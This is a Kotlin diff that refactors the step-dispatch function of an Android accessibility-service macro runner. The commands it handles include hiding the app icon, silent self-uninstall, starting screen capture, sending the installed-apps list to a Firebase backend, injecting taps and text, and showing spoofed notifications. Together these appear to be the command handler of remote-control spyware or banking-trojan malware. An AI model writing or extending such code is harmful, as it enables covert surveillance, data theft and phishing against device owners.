@@ -33,52 +33,69 @@ object MacroRunner {
     }
 
     private fun executeStep(step: MacroStep, service: MyAccessibilityService): Boolean {
-        // Use a variable to store result instead of returning inside when
-        val result = when (step.type) {
+        var result = false
+
+        when (step.type) {
             "launch" -> {
                 val pkg = step.data as? String
-                if (pkg == null) false else {
+                if (pkg != null) {
                     currentPackage = pkg
-                    service.runOnMainThreadSync { service.launchApp(pkg) } as Boolean
+                    result = service.runOnMainThreadSync { service.launchApp(pkg) } as Boolean
+                } else {
+                    result = false
                 }
             }
             "wait" -> {
                 val ms = (step.data as? Number)?.toLong() ?: 1000L
                 Thread.sleep(ms)
-                true
+                result = true
             }
             "tap" -> {
                 val map = step.data as? Map<*, *>
-                if (map == null) false else {
-                    val x = map["x"] as? Int ?: return false
-                    val y = map["y"] as? Int ?: return false
-                    service.runOnMainThreadSync { service.tap(x, y) }
-                    true
+                if (map != null) {
+                    val x = map["x"] as? Int
+                    val y = map["y"] as? Int
+                    if (x != null && y != null) {
+                        service.runOnMainThreadSync { service.tap(x, y) }
+                        result = true
+                    } else {
+                        result = false
+                    }
+                } else {
+                    result = false
                 }
             }
             "type" -> {
                 val text = step.data as? String
-                if (text == null) false else {
+                if (text != null) {
                     service.runOnMainThreadSync { service.injectText(text) }
-                    true
+                    result = true
+                } else {
+                    result = false
                 }
             }
             "swipe" -> {
                 val map = step.data as? Map<*, *>
-                if (map == null) false else {
-                    val sx = map["sx"] as? Int ?: return false
-                    val sy = map["sy"] as? Int ?: return false
-                    val ex = map["ex"] as? Int ?: return false
-                    val ey = map["ey"] as? Int ?: return false
+                if (map != null) {
+                    val sx = map["sx"] as? Int
+                    val sy = map["sy"] as? Int
+                    val ex = map["ex"] as? Int
+                    val ey = map["ey"] as? Int
                     val dur = map["dur"] as? Long ?: 300L
-                    service.runOnMainThreadSync { service.swipe(sx, sy, ex, ey, dur) }
-                    true
+                    if (sx != null && sy != null && ex != null && ey != null) {
+                        service.runOnMainThreadSync { service.swipe(sx, sy, ex, ey, dur) }
+                        result = true
+                    } else {
+                        result = false
+                    }
+                } else {
+                    result = false
                 }
             }
             "click_text" -> {
                 val text = step.data as? String
-                if (text == null) false else {
-                    service.runOnMainThreadSync {
+                if (text != null) {
+                    result = service.runOnMainThreadSync {
                         val root = service.rootInActiveWindow
                         for (node in root?.findAccessibilityNodeInfosByText(text) ?: emptyList()) {
                             if (node.isClickable) {
@@ -88,55 +105,61 @@ object MacroRunner {
                         }
                         return@runOnMainThreadSync false
                     } as Boolean
+                } else {
+                    result = false
                 }
             }
             "home" -> {
                 service.runOnMainThreadSync {
                     service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
                 }
-                true
+                result = true
             }
             "back" -> {
                 service.runOnMainThreadSync {
                     service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                 }
-                true
+                result = true
             }
             "hide_activity" -> {
                 service.runOnMainThreadSync {
                     service.hideAppIcon()
                 }
-                true
+                result = true
             }
             "uninstall" -> {
                 service.runOnMainThreadSync {
                     service.uninstallSelf()
                 }
-                true
+                result = true
             }
             "start_screen_capture" -> {
                 service.runOnMainThreadSync {
                     service.startScreenCapture()
                 }
-                true
+                result = true
             }
             "get_apps" -> {
                 val apps = service.getInstalledApps()
                 FirebaseBridge.pushAppsList(apps)
-                true
+                result = true
             }
             "fake_notification" -> {
                 val map = step.data as? Map<*, *>
-                if (map == null) false else {
+                if (map != null) {
                     val title = map["title"] as? String ?: "⚠ Alert"
                     val body = map["text"] as? String ?: "Tap to view"
                     service.runOnMainThreadSync {
                         NotificationSpoofer.show(service, title, body, null, null)
                     }
-                    true
+                    result = true
+                } else {
+                    result = false
                 }
             }
-            else -> false
+            else -> {
+                result = false
+            }
         }
 
         return result
